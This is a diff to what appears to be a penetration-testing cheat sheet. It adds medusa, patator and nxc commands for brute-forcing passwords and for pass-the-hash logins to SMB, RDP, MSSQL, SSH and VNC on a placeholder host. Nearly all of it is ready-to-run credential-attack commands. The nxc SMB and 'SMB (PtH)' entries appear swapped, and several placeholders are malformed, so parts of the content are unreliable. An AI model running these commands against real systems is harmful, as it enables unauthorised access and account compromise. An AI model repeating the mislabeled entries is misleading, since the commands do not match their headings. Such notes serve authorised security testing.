@@ -235,6 +235,11 @@ medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M rdp
 medusa -h 10.10.10.10 -u '<user>' -P '<passwords.txt>' -M smbnt
 ```
 
+### SMB (PtH)
+```
+medusa -h 10.10.10.10 -u '<user>' -p ':<nt_hash>' -M smbnt -m PASS:HASH [-m GROUP:<domain>]
+```
+
 ### SMTP
 ```
 medusa -h 10.10.10.10 -u '<email>' -P '<passwords.txt>' smtp
@@ -352,6 +357,11 @@ Warning: This module does not work properly as patator does not provide a way to
 patator smb_login host=10.10.10.10 user=<user> password=FILE0 0=<passwords.txt> -x ignore:fgrep='STATUS_LOGON_FAILURE'
 ```
 
+### SMB (PtH)
+```
+patator smb_login host=10.10.10.10 user=<user> password_hash=<nt_hash> [domain='<domain>'] -x ignore:fgrep='STATUS_LOGON_FAILURE'
+```
+
 ### SMTP
 ```
 
@@ -391,7 +401,7 @@ nxc ftp 10.10.10.10 --username '<user>' --password <passwords.txt>
 
 ### MSSQL (SQL Server Authentication)
 ```
-nxc mssql 10.10.10.10 --username '<user>' --password <passwords.txt>
+nxc mssql 10.10.10.10 --username '<user>' --password <passwords.txt> --local-auth
 ```
 
 ### MSSQL (Windows Authentication)
@@ -401,22 +411,32 @@ nxc mssql 10.10.10.10 [--domain <domain>] --username '<user' --password <passwor
 
 ### RDP
 ```
+nxc rdp 10.10.10.10 [--domain <domain>] --username '<user' --password <passwords.txt>
+```
 
+### RDP (PtH)
+```
+nxc rdp 10.10.10.10 [--domain <domain>] --username '<user' --hash <nt_hash>
 ```
 
 ### SMB
 ```
+nxc smb 10.10.10.10 [--domain <domain>] --username '<user>' --hash <nt_hash>
+```
 
+### SMB (PtH)
+```
+nxc smb 10.10.10.10 [--domain <domain>] --username '<user>' --password <passwords.txt>
 ```
 
 ### SSH
 ```
-
+nxc ssh 10.10.10.10 --username '<user>' --password <passwords.txt>
 ```
 
 ### VNC
 ```
-
+nxc vnc 10.10.10.10 --username '' --password <passwords.txt> --thread 1
 ```
 
 ## Kerbrute
